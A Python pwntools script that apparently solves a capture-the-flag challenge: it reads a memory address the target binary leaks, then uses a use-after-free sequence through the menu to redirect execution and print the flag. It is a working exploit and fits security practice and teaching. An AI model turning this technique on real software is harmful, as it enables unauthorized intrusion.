from pwn import context, log, p32, remote, sys

context.binary = 'vuln'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'(e)xit\n', b'S')
    p.recvuntil(b'OOP! Memory leak...')
    leak = int(p.recvline().decode().strip(), 16)

    p.sendlineafter(b'(e)xit\n', b'M')
    p.sendlineafter(b'Enter your username: \n', b'AAA')  

    p.sendlineafter(b'(e)xit\n', b'I')
    p.sendlineafter(b'(Y/N)?\n', b'Y')

    p.sendlineafter(b'(e)xit\n', b'L')
    p.sendlineafter(b'try anyways:\n', p32(leak))

    flag = p.recvline().decode().strip()

    p.close()

    log.success(f'Flag: {flag}')


if __name__ == '__main__':
    main()
